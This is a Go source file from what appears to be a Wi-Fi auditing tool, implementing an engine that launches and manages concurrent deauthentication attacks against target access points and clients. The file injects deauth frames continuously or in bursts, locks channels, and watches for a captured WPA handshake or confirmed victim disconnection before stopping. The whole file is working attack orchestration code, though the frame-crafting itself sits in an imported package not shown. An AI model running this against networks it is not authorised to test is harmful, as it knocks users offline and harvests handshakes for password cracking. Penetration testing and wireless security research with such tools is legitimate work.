package deauth

import (
	"context"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/lcalzada-xor/wmap/internal/adapters/sniffer/capture"
	"github.com/lcalzada-xor/wmap/internal/adapters/sniffer/driver"
	"github.com/lcalzada-xor/wmap/internal/adapters/sniffer/injection"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
)

// AttackController manages the lifecycle of a single deauth attack
type AttackController struct {
	ID       string
	Config   domain.DeauthAttackConfig
	Status   domain.DeauthAttackStatus
	CancelFn context.CancelFunc
	StatusCh chan domain.DeauthAttackStatus
	mu       sync.RWMutex
	injector *injection.Injector // Dedicated injector for this attack (if specific interface used)
}

// DeauthEngine manages multiple concurrent deauth attacks
type DeauthEngine struct {
	injector      *injection.Injector
	activeAttacks map[string]*AttackController
	mu            sync.RWMutex
	maxConcurrent int
	locker        capture.ChannelLocker
	Logger        func(string, string) // Message, Level ("info", "warning", "danger", "success")
}

// NewDeauthEngine creates a new deauth attack engine
func NewDeauthEngine(injector *injection.Injector, locker capture.ChannelLocker, maxConcurrent int) *DeauthEngine {
	if maxConcurrent <= 0 {
		maxConcurrent = 5 // Default max concurrent attacks
	}
	return &DeauthEngine{
		injector:      injector,
		activeAttacks: make(map[string]*AttackController),
		maxConcurrent: maxConcurrent,
		locker:        locker,
	}
}

// SetLogger sets the callback for logging events
func (e *DeauthEngine) SetLogger(logger func(string, string)) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.Logger = logger
}

// log acts as a multiplexer for logs: stdout + callback
func (e *DeauthEngine) log(message string, level string) {
	// Stdout
	prefix := "[DEAUTH]"
	if level == "danger" || level == "error" {
		prefix = "[DEAUTH ERROR]"
	}
	log.Printf("%s %s", prefix, message)

	// Callback
	e.mu.RLock()
	defer e.mu.RUnlock()
	if e.Logger != nil {
		go e.Logger(message, level)
	}
}

// StartAttack initiates a new deauth attack
func (e *DeauthEngine) StartAttack(config domain.DeauthAttackConfig) (string, error) {
	// Cleanup finished attacks to prevent reaching limit with stale "stopped" attacks
	// Note: CleanupFinished takes its own lock
	e.CleanupFinished()

	// 1. Check concurrent limits (Short Lock)
	e.mu.Lock()
	if len(e.activeAttacks) >= e.maxConcurrent {
		e.mu.Unlock()
		return "", fmt.Errorf("maximum concurrent attacks (%d) reached", e.maxConcurrent)
	}
	e.mu.Unlock()

	// 2. Validate configuration (No Lock)
	if config.TargetMAC == "" {
		return "", fmt.Errorf("target MAC is required")
	}

	if config.AttackType == domain.DeauthUnicast || config.AttackType == domain.DeauthTargeted {
		if config.ClientMAC == "" {
			return "", fmt.Errorf("client MAC is required for %s attack", config.AttackType)
		}
	}

	// Generate unique attack ID
	attackID := uuid.New().String()

	// 3. Handle Interface Selection & injection.Injector Creation (No Lock, possibly slow I/O)
	if config.Interface == "" && e.injector != nil {
		config.Interface = e.injector.Interface
	}

	var attackInjector *injection.Injector = e.injector // Default to shared injector
	var dedicatedInjector *injection.Injector = nil

	if config.Interface != "" {
		// Optimization: Check if default injector is already on this interface
		if e.injector != nil && e.injector.Interface == config.Interface {
			attackInjector = e.injector
			e.log(fmt.Sprintf("Reusing default injector for interface %s", config.Interface), "info")
		} else {
			// Enforce Channel if provided
			if config.Channel > 0 {
				if err := driver.SetInterfaceChannel(config.Interface, config.Channel); err != nil {
					e.log(fmt.Sprintf("Warning: Failed to set channel %d on %s: %v", config.Channel, config.Interface, err), "warning")
					// We proceed anyway, maybe it's already set or driver handles it
				} else {
					e.log(fmt.Sprintf("Set channel %d on %s", config.Channel, config.Interface), "info")
				}

			}

			// Create a new injector for this specific interface
			inj, err := injection.NewInjector(config.Interface)
			if err != nil {
				return "", fmt.Errorf("failed to create injector for interface %s: %w", config.Interface, err)
			}
			attackInjector = inj
			dedicatedInjector = inj
		}
	}

	// 4. Create and Register Controller (Short Lock)
	ctx, cancel := context.WithCancel(context.Background())
	statusCh := make(chan domain.DeauthAttackStatus, 10)

	controller := &AttackController{
		ID:       attackID,
		Config:   config,
		CancelFn: cancel,
		StatusCh: statusCh,
		injector: dedicatedInjector, // Store dedicated injector for cleanup
		Status: domain.DeauthAttackStatus{
			ID:          attackID,
			Config:      config,
			Status:      domain.AttackPending,
			PacketsSent: 0,
			StartTime:   time.Now(),
		},
	}

	e.mu.Lock()
	e.activeAttacks[attackID] = controller
	e.mu.Unlock()

	// 5. Start the attack (No Lock)
	go e.runAttack(ctx, controller, attackInjector)

	e.log(fmt.Sprintf("Started attack %s: Type=%s Target=%s Interface=%s",
		attackID, config.AttackType, config.TargetMAC, config.Interface), "success")

	return attackID, nil
}

// runAttack executes the attack logic
func (e *DeauthEngine) runAttack(ctx context.Context, controller *AttackController, injector *injection.Injector) {
	// Wrapper implementation using ExecuteWithLock if locker exists
	action := func() error {
		defer func() {
			// Close dedicated injector to avoid leakage
			// We lock to prevent race with StopAttack
			controller.mu.Lock()
			if controller.injector != nil {
				controller.injector.Close()
				// We don't set to nil here to avoid race, but Close() is effectively final
			}
			controller.mu.Unlock()

			if r := recover(); r != nil {
				log.Printf("[DEAUTH] Attack %s panicked: %v", controller.ID, r)
				controller.mu.Lock()
				controller.Status.Status = domain.AttackFailed
				controller.Status.ErrorMessage = fmt.Sprintf("panic: %v", r)
				now := time.Now()
				controller.Status.EndTime = &now
				controller.mu.Unlock()
				e.log(fmt.Sprintf("Attack %s CRASHED: %v", controller.ID, r), "danger")
				// Ensure we cancel the context to cleanup any lingering goroutines
				controller.CancelFn()
			}
		}()

		// Update status to running
		controller.mu.Lock()
		controller.Status.Status = domain.AttackRunning
		controller.mu.Unlock()

		config := controller.Config

		// Effectiveness Monitoring
		monitorEvents := make(chan string, 10)
		monitorCtx, monitorCancel := context.WithCancel(ctx)
		defer monitorCancel()

		// Check if injector is available
		if injector == nil {
			return fmt.Errorf("no injector available")
		}

		go injector.StartMonitor(monitorCtx, config.TargetMAC, monitorEvents)

		// Start Monitoring Loop
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				case event := <-monitorEvents:
					if event == "handshake" {
						e.log(fmt.Sprintf("Handshake captured for attack %s! Stopping.", controller.ID), "success")
						controller.mu.Lock()
						controller.Status.HandshakeCaptured = true
						controller.mu.Unlock()
						// Stop the attack
						controller.CancelFn()
						return
					}
					if event == "probe" {
						e.log(fmt.Sprintf("Target %s sent Probe Request - CONFIRMED DISCONNECTION", config.TargetMAC), "success")
					}
					if event == "disconnected" {
						e.log(fmt.Sprintf("Target %s silenced (No data > 3s) - EFFECTIVE DISCONNECTION", config.TargetMAC), "success")
						controller.mu.Lock()
						controller.Status.Status = domain.AttackStopped
						controller.mu.Unlock()
						controller.CancelFn()
						return
					}
				}
			}
		}()

		// Determine if continuous or burst
		if config.PacketCount == 0 {
			// Continuous attack
			if err := injector.StartContinuousDeauth(ctx, config, controller.StatusCh); err != nil {
				return err
			}
		} else {
			// Burst attack
			if err := injector.SendDeauthBurst(ctx, config); err != nil {
				return err
			} else {
				controller.mu.Lock()
				controller.Status.PacketsSent = config.PacketCount
				controller.Status.Status = domain.AttackStopped
				controller.mu.Unlock()
				e.log(fmt.Sprintf("Attack %s: Burst finished (%d packets)", controller.ID, config.PacketCount), "success")
			}
		}

		return nil
	}

	// Execution Logic
	var err error
	if e.locker != nil && controller.Config.Channel > 0 {
		e.log(fmt.Sprintf("Channel %d locked on %s for attack", controller.Config.Channel, controller.Config.Interface), "info")
		err = e.locker.ExecuteWithLock(ctx, controller.Config.Interface, controller.Config.Channel, action)
	} else {
		err = action()
	}

	if err != nil {
		e.log(fmt.Sprintf("Attack %s failed: %v", controller.ID, err), "error")
		controller.mu.Lock()
		controller.Status.Status = domain.AttackFailed
		controller.Status.ErrorMessage = err.Error()
		controller.mu.Unlock()
	} else {
		// Mark as completed if not already failed/stopped
		controller.mu.Lock()
		if controller.Status.Status == domain.AttackRunning {
			controller.Status.Status = domain.AttackStopped
		}
		now := time.Now()
		controller.Status.EndTime = &now
		controller.mu.Unlock()
		e.log(fmt.Sprintf("Attack %s completed", controller.ID), "info")
	}
}

// StopAttack stops a running attack
func (e *DeauthEngine) StopAttack(id string, force bool) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return fmt.Errorf("attack %s not found", id)
	}

	controller.mu.Lock()
	defer controller.mu.Unlock()

	if !force && controller.Status.Status != domain.AttackRunning && controller.Status.Status != domain.AttackPaused {
		return fmt.Errorf("attack %s is not active (status: %s)", id, controller.Status.Status)
	}

	// Cancel the context to stop the attack
	controller.CancelFn()

	// Close dedicated injector if exists
	if controller.injector != nil {
		controller.injector.Close()
	}

	controller.Status.Status = domain.AttackStopped
	now := time.Now()
	controller.Status.EndTime = &now
	if force {
		controller.Status.ErrorMessage = "Force stopped by user"
	}

	e.log(fmt.Sprintf("Stopped attack %s (force=%v)", id, force), "warning")

	return nil
}

// PauseAttack pauses a running attack (not fully implemented - would need more complex state management)
func (e *DeauthEngine) PauseAttack(id string) error {
	e.mu.RLock()
	defer e.mu.RUnlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return fmt.Errorf("attack %s not found", id)
	}

	controller.mu.Lock()
	defer controller.mu.Unlock()

	if controller.Status.Status != domain.AttackRunning {
		return fmt.Errorf("attack %s is not running", id)
	}

	// For now, pause is equivalent to stop
	// A full implementation would need pause/resume channels
	controller.CancelFn()
	controller.Status.Status = domain.AttackPaused

	e.log(fmt.Sprintf("Paused attack %s", id), "warning")

	return nil
}

// ResumeAttack resumes a paused attack (placeholder)
func (e *DeauthEngine) ResumeAttack(id string) error {
	e.mu.RLock()
	defer e.mu.RUnlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return fmt.Errorf("attack %s not found", id)
	}

	controller.mu.Lock()
	defer controller.mu.Unlock()

	if controller.Status.Status != domain.AttackPaused {
		return fmt.Errorf("attack %s is not paused", id)
	}

	// For now, resume would require restarting the attack
	// A full implementation would need more sophisticated state management
	return fmt.Errorf("resume not yet implemented - please start a new attack")
}

// GetAttackStatus returns the current status of an attack
func (e *DeauthEngine) GetAttackStatus(id string) (domain.DeauthAttackStatus, error) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	controller, exists := e.activeAttacks[id]
	if !exists {
		return domain.DeauthAttackStatus{}, fmt.Errorf("attack %s not found", id)
	}

	controller.mu.RLock()
	defer controller.mu.RUnlock()

	return controller.Status, nil
}

// ListActiveAttacks returns all active attacks
func (e *DeauthEngine) ListActiveAttacks() []domain.DeauthAttackStatus {
	e.mu.RLock()
	defer e.mu.RUnlock()

	statuses := make([]domain.DeauthAttackStatus, 0, len(e.activeAttacks))
	for _, controller := range e.activeAttacks {
		controller.mu.RLock()
		statuses = append(statuses, controller.Status)
		controller.mu.RUnlock()
	}

	return statuses
}

// CleanupFinished removes finished attacks from the active list
func (e *DeauthEngine) CleanupFinished() int {
	e.mu.Lock()
	removed := 0
	for id, controller := range e.activeAttacks {
		controller.mu.RLock()
		isFinished := controller.Status.Status == domain.AttackStopped ||
			controller.Status.Status == domain.AttackFailed
		controller.mu.RUnlock()

		if isFinished {
			delete(e.activeAttacks, id)
			removed++
		}
	}
	e.mu.Unlock() // Unlock BEFORE logging

	if removed > 0 {
		e.log(fmt.Sprintf("Cleaned up %d finished attacks", removed), "system")
	}

	return removed
}

// StopAll stops all active attacks
func (e *DeauthEngine) StopAll() {
	e.mu.Lock()
	// Collect IDs to avoid deadlock (StopAttack takes the lock again)
	ids := make([]string, 0, len(e.activeAttacks))
	for id := range e.activeAttacks {
		ids = append(ids, id)
	}
	e.mu.Unlock()

	for _, id := range ids {
		if err := e.StopAttack(id, true); err != nil {
			e.log(fmt.Sprintf("Failed to stop attack %s: %v", id, err), "error")
		}
	}

	e.log("Stopped all attacks", "system")
}
